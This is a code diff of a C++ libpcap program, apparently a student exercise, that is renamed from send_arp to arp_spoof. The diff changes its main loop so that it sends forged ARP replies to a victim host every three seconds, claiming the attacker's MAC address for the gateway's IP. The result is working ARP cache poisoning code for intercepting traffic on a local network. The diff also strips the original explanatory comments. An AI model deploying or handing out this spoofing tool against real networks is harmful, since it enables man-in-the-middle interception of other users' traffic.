@@ -5,6 +5,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <unistd.h>
 
 using namespace std;
 
@@ -37,35 +38,27 @@ struct hdr_tosend {
 };
 
 void usage() {
-    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
-    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
+    printf("syntax: arp_spoof <interface> <sender ip> <target ip>\n");
+    printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1\n");
 }
 
 int get_myinterface(char *dev, uint8_t my_mac[6]) {
 
-    // https://github.com/jungvely97/arp_spoof/blob/master/main.c
-    // https://blog.naver.com/PostView.nhn?blogId=cumulusworld&logNo=220102945835
-
-    int tohex, i = 0;
     FILE* fp;
+    int tohex, i = 0;
     char cmd[300] = {0x0};
     char mac[18] = {0x0};
 
     sprintf(cmd, "ifconfig %s | grep HWaddr | awk '{print $5}'", dev);
     fp = popen(cmd, "r");
-    // fgets 함수: FILE 구조체를 사용하여 파일 입출력 스트림에서 문자열을 가져오는 함수
     fgets(mac, sizeof(mac), fp);
     pclose(fp);
 
-    // strtok : https://dojang.io/mod/page/view.php?id=376
-    char *ptr = strtok(mac, ":"); // 공백 문자를 기준으로 문자열을 자름
-    while(ptr != NULL) { // 자른 문자열이 나오지 않을 때까지 반복
-
+    char *ptr = strtok(mac, ":");
+    while(ptr != NULL) {
         tohex = strtol(ptr, NULL, 16);
         my_mac[i] = tohex;
         i++;
-        // cout << tohex;
-        // cout << ptr;
         ptr = strtok(NULL, ":");
     }
     return 0;
@@ -93,7 +86,7 @@ int send_arp_requestpacket(pcap_t* handle, uint8_t mac[6], uint8_t sip[4], uint8
     if (pcap_sendpacket(handle, (const u_char*)etharph, 42) != 0) {
            cout << " Error send arp request packet" << endl;
            return -1;
-    } else cout << " Send arp request packet" << endl;
+    } else cout << "Send arp request packet" << endl;
     return 0;
 }
 
@@ -139,37 +132,34 @@ int main(int argc, char *argv[])
 
         etharph = (hdr_tosend*)packet;
         if(etharph->eth.h_proto == htons(ETHERTYPE_ARP) && etharph->arph.ar_op == htons(ARPOP_REPLY) && memcmp(etharph->eth.h_dest, mac, 6)==0 && onetime == 0) {
-
             onetime = 1;
             memcpy(victim_mac, etharph->eth.h_source, 6);
             cout << " Get victim mac (for arp reply)" << endl;
             cout << "*-------------------*" << endl << endl;
         }
 
-        if(etharph->eth.h_proto == htons(ETHERTYPE_ARP) && etharph->arph.ar_op == htons(ARPOP_REPLY) && memcmp(etharph->eth.h_dest, mac, 6)==0 && onetime == 1) {
+        // Sender : Attacker mac address
+        memcpy(etharph->arph.__ar_sha, mac, 6);
+        memcpy(etharph->eth.h_source, mac, 6);
+        memcpy(etharph->arph.__ar_sip, target_ip, 4);
 
-            // Sender : Attacker mac address
-            memcpy(etharph->arph.__ar_sha, mac, 6);
-            memcpy(etharph->eth.h_source, mac, 6);
-            memcpy(etharph->arph.__ar_sip, victim_ip, 4);
+        // Target
+        memcpy(etharph->eth.h_dest, victim_mac, 6);
+        memcpy(etharph->arph.__ar_tha, victim_mac, 6);
+        memcpy(etharph->arph.__ar_tip, victim_ip, 4);
 
-            // Target
-            memcpy(etharph->eth.h_dest, victim_mac, 6);
-            memcpy(etharph->arph.__ar_tha, victim_mac, 6);
-            memcpy(etharph->arph.__ar_tip, target_ip, 4);
+        etharph->eth.h_proto = htons(ETHERTYPE_ARP);
+        etharph->arph.ar_hrd = htons(0x0001);
+        etharph->arph.ar_pro = htons(0x0800);
+        etharph->arph.ar_hln = 0x06;
+        etharph->arph.ar_pln = 0x04;
+        etharph->arph.ar_op = htons(0x0002);
 
-            etharph->eth.h_proto = htons(ETHERTYPE_ARP);
-            etharph->arph.ar_hrd = htons(0x0001);
-            etharph->arph.ar_pro = htons(0x0800);
-            etharph->arph.ar_hln = 0x06;
-            etharph->arph.ar_pln = 0x04;
-            etharph->arph.ar_op = htons(0x0002);
-
-            if (pcap_sendpacket(handle, (const u_char*)etharph, 42) != 0) {
-                   cout << "Error send arp reply packet" << endl;
-                   return -1;
-            } else cout << "Send arp reply packet" << endl;
-        }
+        if (pcap_sendpacket(handle, (const u_char*)etharph, 42) != 0) {
+            cout << "Error send arp reply packet" << endl;
+            return -1;
+        } else cout << "Send arp reply packet" << endl;
+        sleep(3);
     }
     pcap_close(handle);
 }
